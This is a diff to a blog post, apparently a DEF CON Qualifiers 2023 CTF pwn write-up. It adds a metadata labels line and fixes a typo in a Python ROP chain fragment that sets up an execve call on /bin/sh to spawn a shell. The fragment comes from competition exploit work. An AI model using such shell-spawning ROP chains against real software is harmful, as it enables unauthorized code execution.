@@ -4,6 +4,7 @@ tags = ["PWN", "Defcon"]
 description = "I played with a team of about 50 CTF players during defcon Qualifiers 2023!"
 date = "May 27th"
 author = "GoldenBoy"
+labels = ["defcon","open-house","ifuckup","livectf","conclusion"]
 #do not include @ cover = "" tags = ["", ""] keywords = ["", ""] description = "" showFullContent = false readingTime = false hideComments = false color = "" #color from the theme settings 
 +++
 
@@ -38,7 +39,7 @@ This took a bit of time, but was pretty easy, considering there is a syscall wra
     rop_chain += p32(11) #bytes to read
     rop_chain += p32(base + syscall_wrapper_offset) #call again
     rop_chain += p32(0) #padding
-    rop_chai += p32(11) #execve
+    rop_chain += p32(11) #execve
     rop_chain += p32(base + bin_sh_off) #ptr to bin sh
     rop_chain += p32(0) #argv
     rop_chain += p32(0) #envp
